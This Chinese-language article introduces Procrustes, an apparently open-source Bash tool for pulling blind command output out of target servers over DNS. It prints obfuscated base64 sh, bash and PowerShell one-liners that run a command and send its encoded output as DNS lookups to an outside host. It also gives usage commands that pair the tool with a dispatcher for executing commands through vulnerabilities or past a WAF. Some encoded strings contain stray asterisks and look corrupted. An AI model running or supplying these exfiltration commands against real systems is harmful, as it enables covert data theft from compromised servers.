![](https://image.3001.net/images/20210320/1616254730_6056170ad0a1948c1deb2.jpg!small)

## Procrustes

Procrustes是一个能够自动从DNS流量中提取出数据的Bash脚本，我们可以使用该脚本来检测服务器端执行的Blind命令。因为在有些情况下，除了DNS流量之外，服务器端的所有出站流量都会被屏蔽，这也就意味着攻击者将有可能利用DNS流量来执行攻击行为，因此Procrustes将能够帮助广大研究人员分析并检测通过DNS流量执行的Blind命令。

该脚本当前支持SH、Bash和PowerShell，并且兼容exec风格的命令执行，比如说ja*va.lang.Runtime.exec等等。

## 工具运行演示样例

### Unstaged：

![](https://image.3001.net/images/20210320/1616254747_6056171b22aae2474c237.gif!small)

### Staged：

![](https://image.3001.net/images/20210320/1616254765_6056172d7ae9e6cb700d2.gif)

对于它的操作，脚本将我们要在目标服务器上运行的命令作为输入，并根据目标Shell对其进行转换，以便允许通过DNS对其输出进行过滤。在命令被转换之后，它被返回给“调度器”。这个调度器是一个由用户提供的程序，负责将命令作为输入，并通过任何必要的方式（例如利用漏洞）在目标服务器上执行。在目标服务器上执行命令后，它将触发对包含数据块的DNS名称服务器的DNS请求。Procrustes将能够监听这些请求，直到用户提供的命令的输出被完全过滤。

下面给出的是支持的命令转换形式，针对的是提取命令“ls”生成的转换命令。

 **SH：**

    
    
    sh -c $@|base64${IFS}-d|sh . echo IGRpZyBAMCArdHJpZXM9NSBgKGxzKXxiYXNlNjQgLXcwfHdjIC1jYC5sZW4xNjAzNTQxMTc*4LndoYXRldi5lcgo=

 **Bash：**

    
    
    bash -c {echo,IG5zbG9va3VwIGAobHMpfGJhc2U2NCAtdzB8d2MgLWNgLmxlbi4xNjAzMDMwNTYwLndoYXRldi5lcgo=}|{base64,-d}|bash

 **PowerShell：**

    
    
    powershell -enc UgBlAHMAbwBsAHYAZQAtAEQAbgBzAE4AYQBtAGUAIAAkACgAIgB7ADAAfQAuAHsAMQB9AC*4AewAyAH0AIgAgAC0AZgAgACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC*4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUA*VABGADgALgBHAGUAdABCAHkAdABlAHMAKAAoAGwAcwApACkAKQAuAGwAZQBuAGcAdABoACkALAAiAGwAZQBuACIALAAiADEANgAwADMAMAAzADAANAA4ADgALgB3AGgAYQB0AGUAdgAuAGUAcgAiACkACgA=

## 工具下载

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/vp777/procrustes.git

## 工具使用

 **1、本地Bash测试：**

    
    
    ./procroustes_chunked.sh -h whatev.er -d "dig @0 +tries=5" -x dispatcher_examples/local_bash.sh -- 'ls -lha|grep secret' < <(stdbuf -oL tcpdump --immediate -l -i any udp port 53)

 **2、本地PowerShell测试（WSL2）：**

    
    
    stdbuf -oL tcpdump --immediate -l -i any udp port 53|./procroustes_chunked.sh -w ps -h whatev.er -d "Resolve-DnsName -Server wsl2_IP -Name" -x dispatcher_examples/local_powershell_wsl2.sh -- 'gci | % {$_.Name}'

 **3、PowerShell样例，我们SSH进入至我们的NS并获取传入的DNS请求：**

    
    
    ./procroustes_chunked.sh -w ps -h yourdns.host -d "Resolve-DnsName" -x dispatcher_examples/curl_waf.sh -- 'gci | % {$_.Name}' < <(stdbuf -oL ssh user@HOST 'sudo tcpdump --immediate -l udp port 53')

 **4、获取更多操作选项：**

    
    
    ./procroustes_chunked.sh --help

## 项目地址

Procrustes：【[ _GitHub传送门_](https://github.com/vp777/procrustes)】

## 参考资料

> [
> _https://github.com/0xC01DF00D/Collabfiltrator_](https://github.com/0xC01DF00D/Collabfiltrator)
>
> [ _https://github.com/no0be/DNSlivery_](https://github.com/no0be/DNSlivery)

  

